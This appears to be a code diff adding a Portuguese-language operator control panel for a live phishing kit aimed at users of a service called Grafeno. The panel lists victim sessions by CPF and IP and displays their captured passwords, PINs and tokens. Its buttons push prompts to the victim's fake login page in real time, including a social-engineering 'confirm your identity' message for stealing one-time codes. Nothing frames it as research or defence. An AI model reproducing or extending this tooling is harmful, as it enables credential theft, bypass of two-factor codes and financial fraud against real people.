@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="csrf-token" content="XEqQgGHeIQcSn1OBSL8G6RbUJTUNWkNC3hHIC8qM" />
+  <title><%= title %></title>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif; margin: 0; padding: 16px; background: #0f0f12; color: #e2e2e2; }
+    h1 { font-size: 1.4rem; margin: 0 0 16px; color: #00bba7; }
+    .toolbar { margin-bottom: 16px; display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
+    .toolbar a { color: #00bba7; text-decoration: none; }
+    .toolbar a:hover { text-decoration: underline; }
+    .toolbar code { background: #27272a; padding: 2px 6px; border-radius: 4px; font-size: 12px; color: #00bba7; }
+    .badge { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 11px; margin-left: 4px; }
+    .badge.senha { background: #1a472a; color: #4ade80; }
+    .badge.pin { background: #1e3a5f; color: #7dd3fc; }
+    .badge.token { background: #422006; color: #fcd34d; }
+    .badge.cmd { background: #4c1d95; color: #c4b5fd; }
+    table { width: 100%; border-collapse: collapse; background: #18181b; border-radius: 8px; overflow: hidden; }
+    th, td { padding: 10px 12px; text-align: left; border-bottom: 1px solid #27272a; }
+    th { background: #27272a; color: #a1a1aa; font-weight: 600; font-size: 12px; text-transform: uppercase; }
+    tr:hover { background: #1f1f23; }
+    .btns { display: flex; flex-wrap: wrap; gap: 6px; }
+    .btns button { padding: 6px 10px; border: none; border-radius: 6px; cursor: pointer; font-size: 12px; background: #3f3f46; color: #e2e2e2; }
+    .btns button:hover { background: #00bba7; color: #0f0f12; }
+    .btns button.danger:hover { background: #dc2626; color: #fff; }
+    .btns button.success:hover { background: #16a34a; color: #fff; }
+    .comando-input { width: 100%; max-width: 280px; padding: 6px 8px; border-radius: 4px; border: 1px solid #3f3f46; background: #27272a; color: #e2e2e2; font-size: 12px; margin-top: 4px; }
+    .empty { text-align: center; padding: 40px; color: #71717a; }
+    .detalhe { font-size: 12px; color: #a1a1aa; margin-top: 6px; }
+    .detalhe strong { color: #e2e2e2; }
+    .expand-row { cursor: pointer; }
+    .expand-body { display: none; }
+    .expand-body td { background: #1f1f23; padding: 12px; vertical-align: top; }
+    .atualizado { font-size: 11px; color: #71717a; }
+    .dados-valores { font-size: 12px; margin-top: 6px; line-height: 1.5; }
+    .dados-valores span.val { background: #27272a; padding: 2px 6px; border-radius: 4px; margin-right: 8px; margin-bottom: 4px; display: inline-block; font-family: monospace; }
+    .dados-valores .lbl { color: #71717a; margin-right: 4px; }
+    .btn-loading { opacity: 0.7; pointer-events: none; }
+  </style>
+</head>
+<body>
+  <h1>Painel Operador – Grafeno</h1>
+  <div class="toolbar">
+    <strong>Painel:</strong> <code>/painel</code>
+    <a href="/grafeno">Página de login (vítima)</a>
+    <span id="contador">0 sessões</span>
+    <span class="atualizado">Atualiza a cada 5s</span>
+  </div>
+
+  <table id="tabela">
+    <thead>
+      <tr>
+        <th>CPF / Login</th>
+        <th>Comando atual</th>
+        <th>Dados</th>
+        <th>Última atividade</th>
+        <th>Ações</th>
+      </tr>
+    </thead>
+    <tbody id="corpo">
+    </tbody>
+  </table>
+  <div id="vazio" class="empty" style="display:none;">Nenhuma sessão ativa. As sessões aparecem quando alguém inicia o login em /grafeno.</div>
+
+  <script>
+    function getToken() {
+      return document.querySelector('meta[name="csrf-token"]') && document.querySelector('meta[name="csrf-token"]').getAttribute('content') || '';
+    }
+
+    function escapeHtml(str) {
+      if (str == null) return '';
+      var s = String(str);
+      return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
+    }
+
+    function formatarData(ts) {
+      if (!ts) return '-';
+      var d = new Date(ts);
+      return d.toLocaleString('pt-BR');
+    }
+
+    function enviarComando(login, comando, inputComando, btn) {
+      var payload = { login: login, comando: comando };
+      if (inputComando) payload.input_comando = inputComando;
+      var $btn = $(btn);
+      var labelOriginal = btn.dataset.label || comando;
+      $btn.prop('disabled', true).addClass('btn-loading').text('...');
+      $.ajax({
+        url: '/api/comando',
+        method: 'POST',
+        contentType: 'application/json',
+        headers: { 'X-CSRF-TOKEN': getToken() },
+        data: JSON.stringify(payload)
+      }).done(function () {
+        $btn.text('Enviado').removeClass('btn-loading');
+        setTimeout(function () { $btn.prop('disabled', false).text(labelOriginal); }, 1500);
+        carregar();
+      }).fail(function () {
+        $btn.prop('disabled', false).removeClass('btn-loading').text(labelOriginal);
+        alert('Erro ao enviar comando');
+      });
+    }
+
+    function montarAcoes(login) {
+      var html = '<div class="btns">';
+      html += '<button type="button" data-label="Token" onclick="enviarComando(\'' + login + '\', \'codigo_token\', null, this)">Token</button>';
+      html += '<button type="button" data-label="PIN" onclick="enviarComando(\'' + login + '\', \'pin\', null, this)">PIN</button>';
+      html += '<button type="button" data-label="Comando">Comando</button>';
+      html += '<button type="button" data-label="Aguardando" onclick="enviarComando(\'' + login + '\', \'aguardando\', null, this)">Aguardando</button>';
+      html += '<button type="button" data-label="Finalizar" class="danger" onclick="enviarComando(\'' + login + '\', \'finalizar_atendimento\', null, this)">Finalizar</button>';
+      html += '<button type="button" data-label="Enviar p/ Interna" class="success" onclick="enviarComando(\'' + login + '\', \'enviar_para_interna\', null, this)">Enviar p/ Interna</button>';
+      html += '</div>';
+      return html;
+    }
+
+    function carregar() {
+      $.getJSON('/api/sessoes').done(function (data) {
+        var sessoes = data.sessoes || [];
+        $('#contador').text(sessoes.length + ' sessão(ões)');
+        var tbody = $('#corpo');
+        tbody.empty();
+        if (sessoes.length === 0) {
+          $('#vazio').show();
+          return;
+        }
+        $('#vazio').hide();
+        sessoes.forEach(function (s) {
+          var badges = '';
+          if (s.temSenha) badges += '<span class="badge senha">Senha</span>';
+          if (s.temPin) badges += '<span class="badge pin">PIN</span>';
+          if (s.temToken) badges += '<span class="badge token">Token</span>';
+          if (s.temComando) badges += '<span class="badge cmd">Comando</span>';
+          var dadosValores = '<div class="dados-valores">';
+          if (s.senha) dadosValores += '<span class="val"><span class="lbl">Senha:</span>' + escapeHtml(s.senha) + '</span>';
+          if (s.token) dadosValores += '<span class="val"><span class="lbl">Token:</span>' + escapeHtml(s.token) + '</span>';
+          if (s.pin) dadosValores += '<span class="val"><span class="lbl">PIN:</span>' + escapeHtml(s.pin) + '</span>';
+          if (s.comando_valor) dadosValores += '<span class="val"><span class="lbl">Comando:</span>' + escapeHtml((s.comando_valor || '').substring(0, 80)) + (s.comando_valor && s.comando_valor.length > 80 ? '…' : '') + '</span>';
+          dadosValores += '</div>';
+          var tr = '<tr class="expand-row" data-login="' + escapeHtml(s.login) + '">' +
+            '<td><strong>' + escapeHtml(s.cpfFormatado || s.login) + '</strong><div class="detalhe">IP: ' + escapeHtml(s.ip || '-') + '</div></td>' +
+            '<td>' + escapeHtml(s.comando || '-') + '</td>' +
+            '<td>' + (badges || '-') + (dadosValores !== '<div class="dados-valores"></div>' ? dadosValores : '') + '</td>' +
+            '<td class="atualizado">' + formatarData(s.lastUpdate) + '</td>' +
+            '<td>' + montarAcoes(s.login) + '</td></tr>';
+          tbody.append(tr);
+        });
+
+      }).fail(function () {
+        $('#corpo').empty();
+        $('#vazio').show().text('Erro ao carregar sessões.');
+      });
+    }
+
+    $(function () {
+      carregar();
+      setInterval(carregar, 5000);
+      $(document).on('click', '#corpo button[data-label="Comando"]', function () {
+        var login = $(this).closest('tr').data('login');
+        var texto = prompt('Texto para exibir no campo "Confirme sua identidade":', 'Por favor, confirme sua identidade digitando o código que enviamos para seu dispositivo cadastrado.');
+        if (texto === null) return;
+        enviarComando(login, 'comando', texto || '', this);
+      });
+    });
+  </script>
+</body>
+</html>
